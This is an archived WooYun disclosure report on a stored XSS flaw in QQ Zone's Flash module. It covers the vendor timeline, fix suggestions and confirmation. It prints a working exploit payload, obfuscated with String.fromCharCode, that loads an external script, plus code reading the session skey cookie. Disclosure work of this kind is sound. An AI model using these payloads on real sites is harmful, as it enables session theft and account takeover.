@@ -1,0 +1,361 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		QQ空间存储型XSS漏洞（组合利用）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		QQ空间存储型XSS漏洞（组合利用）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-04-16 10:49</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-04-16：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-04-16：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-04-26：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-05-06：	细节向普通白帽子公开<br/>
+									2012-05-16：	细节向实习白帽子公开<br/>
+									2012-05-31：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">不好意思，俺又来了。 <br />
+<br />
+1. QQ空间某处正则混乱，导致恶意构造。<br />
+2. QQ空间某文件存在潜在风险<br />
+3. 1+2 = 此漏洞<br />
+<br />
+ps:乌云什么时候能支持图片批量上传以及插入显示啊= = ，图片一多了，顿时觉得凌乱了。<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 一开始的目标是这个 http://b.qzone.qq.com/cgi-bin/custom/modify_custom_window.cgi，这个页面是用来修改QQ空间模块内容的。这里我选择提交的是FLASH模块。 由于此请求，每请求一次都需要输入一个验证码，所以没办法直接在抓包工具里修改并发送。所以最初是用调试工具去修改DOM属性，然后写自定义值来一次一次的试，后来实在觉得太麻烦了，就自己临时写了个小工具。以下测试均用此工具进行，如下， <br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/16093049c5a07339ad04e389d8b140756c65c2a1.jpg" target="_blank"><img src="../images/16093049c5a07339ad04e389d8b140756c65c2a1.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2. 开始试了此请求的几个参数（这里的参数是指qzml所发送的xml里的若干属性，例如width, height ,wmode etc ..），都被过滤了， 后来懒么，就把能写入内容的都改成了 &#039;\/&lt;&gt;..，结果侧漏了。。 <br />
+<br />
+<br />
+<br />
+测试的qzml请求参数大概是这样：encodeURIComponent(&#039;&lt;qz:title type=&quot;flash&quot; moduleborder=&quot;true&quot;&gt;xxx&lt;/qz:title&gt;&lt;div&gt;&lt;qz:swf swfsrc=&quot;http://ctc.qzs.qq.com/ac/c.gif.swf&quot; width=&quot;\&#039;\/&lt;&gt;&quot; height=&quot;\&#039;\/&lt;&gt;&quot; loop=&quot;\&#039;\/&lt;&gt;&quot; waitforclick=&quot;\&#039;\/&lt;&gt;&quot; wmode=&quot;\&#039;\/&lt;&gt;&quot;/&gt;&lt;/div&gt;&#039;.replace(/\s/g,&quot;+&quot;)).replace(/%2B/g,&quot;+&quot;);<br />
+<br />
+<br />
+<br />
+侧漏效果大概如下：（反正是类似这个效果，懒的回去抓图了。）<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/160934099abb8333d2f10746cc027389e77427f2.jpg" target="_blank"><img src="../images/160934099abb8333d2f10746cc027389e77427f2.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3. 开始分析侧漏原因。 发现height属性把其它属性都吞掉了。 于是其它参数复原，单个测试height，在 height里加入单引号时， 服务器端的正则貌似就凌乱了。 同样有此现象的还有 swfsrc 。 <br />
+<br />
+<br />
+<br />
+因为服务器那边是怎么匹配的，不清楚， 于是就开始各种构造测试，看服务器端输出。 <br />
+<br />
+<br />
+<br />
+反正测试了挺久。 具体就不详述。 因为服务器端输出的embed标签里，总是带着 allowscriptaccess=&quot;never&quot;，导致我们调用的FLASH来执行脚本，所以最终目的，就是想用height来屏蔽掉 allowscriptaccess=&quot;never&quot; 。 <br />
+<br />
+<br />
+<br />
+测试过程中，出现了以下几种阻碍。 <br />
+<br />
+<br />
+<br />
+3A. allowscriptaccess=&quot;never&quot; 成功被我们的 height 吞掉， 但是src属性没了。服务器端输出如下代码:<br />
+<br />
+<br />
+<br />
+&lt;div style=&quot;height: 142px;&quot; id=&quot;cst_flash&quot;&gt;&lt;embed id=&quot;flash&quot; height=&#039;  src=http://ctc.qzs.qq.com/ac/c.gif.swf autostart=&quot;false&quot; loop=&quot;true&quot; invokeurls=&quot;false&quot; allownetworking=&quot;all&quot; allowscriptaccess=&quot;never&quot; wmode=&quot;&#039; type=&quot;application/x-shockwave-flash&quot; width=&quot;&#039;&quot; src=&quot;&quot; invokeurls=&quot;false&quot; scalemode=&quot;noScale&quot; allowscriptaccess=&#039;always&quot;&#039; embed=&quot;embed&quot; menu=&quot;false&quot;&gt;&lt;/div&gt;<br />
+<br />
+<br />
+<br />
+3B. 自己添加了 src 属性， 但是发现服务器端又自己加上了 allowscriptaccess=&quot;never&quot; 。。纠结了。服务器端输出如下代码：<br />
+<br />
+<br />
+<br />
+&lt;div style=&quot;height: 142px;&quot; id=&quot;cst_flash&quot;&gt;&lt;embed id=&quot;flash&quot; height=&quot;/&lt;&gt;  src=http://ctc.qzs.qq.com/ac/c.gif.swf&quot; width=&#039;&amp;amp;&quot;34;src = http &#039; src=&quot;/c.swf&quot; allowscriptaccess=&quot;never&quot; allownetworking=&quot;internal&quot; invokeurls=&quot;false&quot; autostart=&quot;true&quot; menu=&quot;false&quot;&gt; autostart=&quot;false&quot; loop=&quot;true&quot; invokeurls=&quot;false&quot; allownetworking=&quot;all&quot; allowscriptaccess=&quot;never&quot; wmode=&quot;opaque&quot; type=&quot;application/x-shockwave-flash&quot; scaleMode=&quot;noScale&quot; &amp;gt;&lt;/div&gt;<br />
+<br />
+<br />
+<br />
+4. 对于各种无厘头，有时候还是要靠运气。 在3B的代码基础上，偶然发现，如果src属性里加了\&#039;，就不会出现问题。 所以我们构造src地址为 /c.swf?1=\&#039;\&#039;\&#039;， 这样就不会出现 allowscriptaccess参数了。 <br />
+<br />
+<br />
+<br />
+5. 但是问题接着来了，大家都知道， allowscriptaccess 默认是 sameDomain的，哪里去找同域下的FLASH啊。 巧合的是，还真有一个可以用的。 在抓包QQ空间的时候，瞥见这么一个FLASH，<br />
+<br />
+<br />
+<br />
+http://ctc.qzs.qq.com/qzone/v6/accessory/plugin/zoom.swf?onchange=QZONE.frontPageAccessory.zoomDetect.onZoomChange<br />
+<br />
+<br />
+<br />
+我一瞧， 后面这个 QZONE.frontPageAccessory.zoomDetect.onZoomChange 不就是个JS函数么。 于是试了一下。 <br />
+<br />
+<br />
+<br />
+http://ctc.qzs.qq.com/qzone/v6/accessory/plugin/zoom.swf?onchange=alert<br />
+<br />
+<br />
+<br />
+果然可以弹出啊。 这样看来，我们可以利用下。 不过这个 ctc.qzs.qq.com 和 模块的 ctc.qzonestyle.gtimg.cn 还是不是一个域啊， 但是运气好，恰好， 这2个域名，貌似资源文件是一样的，或者有部分是一样的？  ctc.qzonestyle.gtimg.cn 下面也有该FLASH文件。 如下：<br />
+<br />
+<br />
+<br />
+http://ctc.qzonestyle.gtimg.cn/qzone/v6/accessory/plugin/zoom.swf?onchange=alert<br />
+<br />
+<br />
+<br />
+6. 所以，我们最终可以构造出FLASH的src为<br />
+<br />
+<br />
+<br />
+/qzone/v6/accessory/plugin/zoom.swf?onchange=function(){s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.type=String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116);s.src=String.fromCharCode(104,116,116,112,58,47,47,119,119,119,46,116,111,111,108,109,97,111,46,99,111,109,47,116,111,111,108,47,113,113,109,97,105,108,46,106,115);document.body.appendChild(s);}&amp;1=\&#039;\&#039;\&#039;\&#039;<br />
+<br />
+<br />
+<br />
+其中，前面是FLASH地址， onchange参数调用我们自己函数， 1=\&#039;\&#039;\&#039;\&#039; 是为了屏蔽掉 allowscriptaccess=&quot;never&quot; <br />
+<br />
+<br />
+<br />
+7. 上面这个地址我们简写为 {SWFURL}, 它是位于 height属性里的，如下 <br />
+<br />
+<br />
+<br />
+height=&quot;&amp;quot;\&#039;/\&lt; src={SWFURL} style=width:/ &gt;&quot;<br />
+<br />
+<br />
+<br />
+8. = = 写不下去了。。 直接上最后的测试代码。 有点乱。。有些是测试残留，没实际意义，比如里的 &amp;&amp;#34;34; 这种。。<br />
+<br />
+<br />
+<br />
+&quot;qzml&quot;:encodeURIComponent(&#039;&lt;qz:title type=&quot;flash&quot; moduleborder=&quot;true&quot;&gt;xxx&lt;/qz:title&gt;&lt;div&gt;&lt;qz:swf swfsrc=&quot;http://ctc.qzs.qq.com/ac/c.gif.swf\&#039; ALLOWSCRIPTACCESS autostart=true\&#039;\&amp;#x22;\u0009src\u0013=/c.swf / &lt; &gt;&quot; width=&quot;&amp;&amp;#34;34;src = http &quot; height=&quot;&amp;quot;\&#039;/\&lt; src=/qzone/v6/accessory/plugin/zoom.swf?onchange=function(){s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.type=String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116);s.src=String.fromCharCode(104,116,116,112,58,47,47,119,119,119,46,116,111,111,108,109,97,111,46,99,111,109,47,116,111,111,108,47,113,113,109,97,105,108,46,106,115);document.body.appendChild(s);}&amp;1=\&#039;\&#039;\&#039;\&#039; style=width:/ &gt;&quot; loop=&quot;true&quot; waitforclick=&quot;true&quot; wmode=&quot;&quot;/&gt;&lt;/div&gt;&#039;.replace(/\s/g,&quot;+&quot;)).replace(/%2B/g,&quot;+&quot;)<br />
+<br />
+<br />
+<br />
+9. 上面代码会调用我自己的网站的JS。 在调用JS这一步，<br />
+<br />
+<br />
+<br />
+目测 IE 应该是通杀吧？ IE6没试过。 vista+IE7, win7+IE8,9 是可以的。 <br />
+<br />
+<br />
+<br />
+Chrome 也是可以的， ff 下蛋疼了，需要给加上 type=&quot;application/x-shockwave-flash&quot; 才行， 没去弄，这个属性应该也是可以加的上的。<br />
+<br />
+<br />
+<br />
+10. 到这里， 可以alert, 可以跳转。 <br />
+<br />
+<br />
+<br />
+IE下的alert <br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/161010370c5f7611ab6d878c4644a078b1646f38.jpg" target="_blank"><img src="../images/161010370c5f7611ab6d878c4644a078b1646f38.jpg" alt="" width="600"/></a></p><p class="detail"> <br />
+<br />
+<br />
+<br />
+Chrome下的跳转<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/16101112656d3576cc7ee8064add453030ceb398.jpg" target="_blank"><img src="../images/16101112656d3576cc7ee8064add453030ceb398.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+11. 但是我们亲爱的cookies 没办法弹出来啊。 <br />
+<br />
+<br />
+<br />
+原因是，如前所述，模块的域是 ctc.qzonestyle.gtimg.cn ，<br />
+<br />
+<br />
+<br />
+而空间的域是 qq.com ，没有办法跨域获取cookies。 <br />
+<br />
+<br />
+<br />
+不过好在，QQ空间开发人员为我们准备好了这一功能， 原理就是在当前页中，嵌入一个和父窗口同域的iframe页面，来进行通讯。<br />
+<br />
+<br />
+<br />
+我们直接调用 QQ空间开发人员写好的库，来获取cookies，代码如下：<br />
+<br />
+<br />
+<br />
+QZONE.Cross.Client.getInstance().sendInvoke(&#039;QZFL.cookie.get&#039;, &#039;skey&#039;,function(str){<br />
+<br />
+	alert(&quot;您的skey是:&quot;+str);<br />
+<br />
+});<br />
+<br />
+<br />
+<br />
+效果如下：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/16101745597348b4eaa5a0c4068743b790826c00.jpg" target="_blank"><img src="../images/16101745597348b4eaa5a0c4068743b790826c00.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+需要说明的是： 获取cookies这一步，IE下有效， chrome 貌似错误了，粗略看了下，对于跨域请求，Qzone开发人员针对HTML5和普通的采用的是不同的方案，在chrome下莫名的悲剧了。。 我只是调用了你们开发人员写的东西， = = 悲剧别找我，哈哈 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明里的图。   </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1. 服务器端在从提交过去的qzml这段XML里获取FLASH的属性时，正则写错了？ 只是猜测。<br />
+<br />
+2. 目测服务器端验证qzml是否合法的正则不够好， 像 width, height 这种参数，直接 \d{m,n}就可以吧。 貌似 width ,height 属性里什么东西都可以写啊。 只在客户端限制width,height输入框长度为3，没什么实际作用的。。其它属性也一样，什么wmode只需要 true|false 即可。 <br />
+<br />
+3. 这个 http://ctc.qzs.qq.com/qzone/v6/accessory/plugin/zoom.swf?onchange=function(){location=&#039;钓鱼网站&#039;} 单独就是一个漏洞。<br />
+<br />
+<br />
+<br />
+http://ctc.qzs.qq.com/qzone/v6/accessory/plugin/zoom.swf?onchange=QZONE.frontPageAccessory.zoomDetect.onZoomChange 这个被利用的flash文件需修改一下。 在FLASH限制一下 onchange 参数的值。 <br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-06103" title="QQ空间存储型XSS漏洞（组合利用）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2012-04-16 14:58</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告，分析非常专业，我们非常欢迎类似的带有详细分析和思考过程的漏洞。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="6103";
+var bugRating="2";
+var myRating="";
+var ratingCount="11";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
